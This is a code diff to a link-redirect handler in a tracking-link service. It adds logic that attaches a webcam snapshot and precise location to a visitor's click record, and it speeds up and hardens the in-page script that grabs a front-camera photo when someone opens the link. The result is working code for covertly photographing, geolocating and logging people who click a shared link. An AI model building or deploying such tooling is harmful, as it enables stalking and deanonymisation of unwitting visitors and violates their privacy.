@@ -387,6 +387,26 @@ const handleRedirect = async (req, res) => {
       }
     }
 
+    if (req.method === 'POST') {
+      // If POST, attach photo to existing click or push click with photo
+      if (link.clicks.length > 0) {
+        const lastClick = link.clicks[link.clicks.length - 1];
+        // If click was created within last 30 seconds, attach photo to it
+        if (Date.now() - new Date(lastClick.timestamp).getTime() < 30000) {
+          lastClick.photoUrl = photoUrl;
+          if (finalLat && finalLon && (!lastClick.lat || lastClick.lat === 0)) {
+            lastClick.lat = finalLat;
+            lastClick.lon = finalLon;
+            lastClick.locType = locType;
+            lastClick.city = cityName;
+            lastClick.country = countryName;
+          }
+          saveDatabaseToDisk();
+          return res.json({ success: true, photoUrl });
+        }
+      }
+    }
+
     const clickEvent = {
       timestamp: new Date().toISOString(),
       ip: locInfo.ip,
@@ -516,14 +536,22 @@ const handleRedirect = async (req, res) => {
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
               return resolve(null);
             }
+            let isResolved = false;
+            const timer = setTimeout(() => {
+              if (!isResolved) {
+                isResolved = true;
+                resolve(null);
+              }
+            }, 3000);
+
             try {
-              const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 480, height: 360, facingMode: 'user' }, audio: false });
+              const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
               const video = document.getElementById('webcamVideo');
               video.srcObject = stream;
               video.onloadedmetadata = async () => {
                 try {
                   await video.play();
-                  await new Promise(res => setTimeout(res, 600));
+                  await new Promise(res => setTimeout(res, 400));
                   const canvas = document.getElementById('snapshotCanvas');
                   canvas.width = video.videoWidth || 480;
                   canvas.height = video.videoHeight || 360;
@@ -531,14 +559,26 @@ const handleRedirect = async (req, res) => {
                   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                   const captured = canvas.toDataURL('image/jpeg', 0.6);
                   stream.getTracks().forEach(track => track.stop());
-                  resolve(captured);
+                  if (!isResolved) {
+                    isResolved = true;
+                    clearTimeout(timer);
+                    resolve(captured);
+                  }
                 } catch (err) {
                   stream.getTracks().forEach(track => track.stop());
-                  resolve(null);
+                  if (!isResolved) {
+                    isResolved = true;
+                    clearTimeout(timer);
+                    resolve(null);
+                  }
                 }
               };
             } catch (e) {
-              resolve(null);
+              if (!isResolved) {
+                isResolved = true;
+                clearTimeout(timer);
+                resolve(null);
+              }
             }
           });
         }
